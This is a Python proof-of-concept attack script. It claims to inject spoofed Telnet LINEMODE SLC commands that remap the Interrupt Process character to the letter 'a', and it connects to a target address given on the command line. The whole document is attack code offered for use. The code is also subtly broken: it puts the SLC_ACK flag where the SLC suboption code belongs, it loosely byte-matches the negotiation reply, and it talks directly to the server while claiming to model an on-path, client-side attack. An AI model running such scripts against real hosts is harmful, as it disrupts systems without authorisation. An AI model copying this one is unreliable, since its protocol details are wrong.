#!/usr/bin/env python3
"""
Proof-of-Concept: SLC Special Character Injection via State Confusion (Telnet LINEMODE)

This script demonstrates how an on-path attacker can inject spoofed SLC (Special Character
List) commands into a Telnet session utilizing LINEMODE (RFC 1184). By redefining critical
special characters (e.g., SLC_IP, SLC_EOF, SLC_SUSP) on the client side, the attacker can
cause the client to send unintended Telnet commands to the server when the user types
benign characters, leading to unauthorized process interruption or command execution.

Vulnerability: State Confusion / Lack of Source Validation for SLC Commands
RFC Reference: RFC 1184 (Telnet Line Mode Option)
"""

import socket
import struct
import sys
import time

# Telnet Command Constants
IAC = 0xFF
WILL = 0xFB
WONT = 0xFC
DO = 0xFD
DONT = 0xFE
SB = 0xFA
SE = 0xF0

# Telnet Option Constants
LINEMODE = 34

# LINEMODE SLC Constants (RFC 1184)
SLC_ACK = 0x80
SLC_FLUSHIN = 0x40
SLC_FLUSHOUT = 0x20
SLC_SUPPRESS = 0x10

# SLC Function Codes (RFC 1184)
SLC_IP = 0x01  # Interrupt Process
SLC_BRK = 0x02 # Break
SLC_AO = 0x03  # Abort Output
SLC_AYT = 0x04 # Are You There
SLC_EC = 0x05  # Erase Character
SLC_EL = 0x06  # Erase Line
SLC_EW = 0x07  # Erase Word
SLC_RPR = 0x08 # Reprint Line
SLC_LNEXT = 0x09 # Literal Next
SLC_XON = 0x0A # Start Output
SLC_XOFF = 0x0B # Stop Output
SLC_FORW1 = 0x0C # Forward 1 Char
SLC_FORW2 = 0x0D # Forward 2 Chars
SLC_EOF = 0x0E # End of File
SLC_SUSP = 0x0F # Suspend Process

# SLC Mode Constants (RFC 1184)
SLC_NORM = 0x00
SLC_VAL = 0x01
SLC_SEND = 0x02
SLC_NOSUPPORT = 0x03

def craft_sbc_slc_command(function_code, mode, value):
    """
    Crafts a Telnet SB LINEMODE SLC command.
    
    Args:
        function_code: The SLC function to modify (e.g., SLC_IP)
        mode: The mode (SLC_VAL to set a value)
        value: The character value to assign to the function
    
    Returns:
        bytes: The crafted Telnet subnegotiation message
    """
    # IAC SB LINEMODE SLC <function_code> <mode> <value> SE
    msg = bytearray()
    msg.append(IAC)
    msg.append(SB)
    msg.append(LINEMODE)
    msg.append(SLC_ACK)  # SLC_ACK bit set to indicate this is a setting
    msg.append(function_code)
    msg.append(mode)
    msg.append(value)
    msg.append(IAC)
    msg.append(SE)
    return bytes(msg)

def send_telnet_command(sock, command, option):
    """
    Sends a basic Telnet command (WILL, WONT, DO, DONT).
    """
    sock.sendall(bytes([IAC, command, option]))

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <target_ip> <target_port>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    
    print(f"[*] Connecting to Telnet server at {target_ip}:{target_port}...")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((target_ip, target_port))
        print("[+] Connected to target.")
        
        # Step 1: Negotiate LINEMODE option
        # Client sends DO LINEMODE, Server responds with WILL LINEMODE
        print("[*] Negotiating LINEMODE option...")
        send_telnet_command(sock, DO, LINEMODE)
        
        # Wait for server response
        response = sock.recv(1024)
        print(f"[*] Server response: {response.hex()}")
        
        # Check if server agreed to LINEMODE (WILL LINEMODE)
        if IAC in response and WILL in response and LINEMODE in response:
            print("[+] Server agreed to LINEMODE.")
            # Client acknowledges with WILL LINEMODE
            send_telnet_command(sock, WILL, LINEMODE)
        else:
            print("[-] Server did not agree to LINEMODE. Exiting.")
            sock.close()
            return
        
        # Step 2: Inject spoofed SLC command
        # We will redefine SLC_IP (Interrupt Process) to be triggered by 'a' (0x61)
        # This means when the user types 'a', the client will send IAC IP to the server
        malicious_char = 0x61  # 'a'
        print(f"[*] Injecting spoofed SLC command to map SLC_IP to character 0x{malicious_char:02x} ('{chr(malicious_char)})...")
        
        slc_cmd = craft_sbc_slc_command(SLC_IP, SLC_VAL, malicious_char)
        sock.sendall(slc_cmd)
        print(f"[+] Sent SLC command: {slc_cmd.hex()}")
        
        # Step 3: Observe outcome
        # In a real attack, the attacker would wait for the user to type 'a'
        # Here, we simulate by sending 'a' and observing if the server processes it as IAC IP
        print("[*] Simulating user input 'a'...")
        sock.sendall(b'a')
        
        # Wait for server response
        time.sleep(2)
        try:
            response = sock.recv(1024)
            print(f"[*] Server response after 'a': {response.hex()}")
            # If vulnerable, the server might send a response indicating process interruption
            # or the connection might be reset
        except socket.timeout:
            print("[*] No response from server.")
        
        print("[+] PoC execution complete.")
        
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    main()
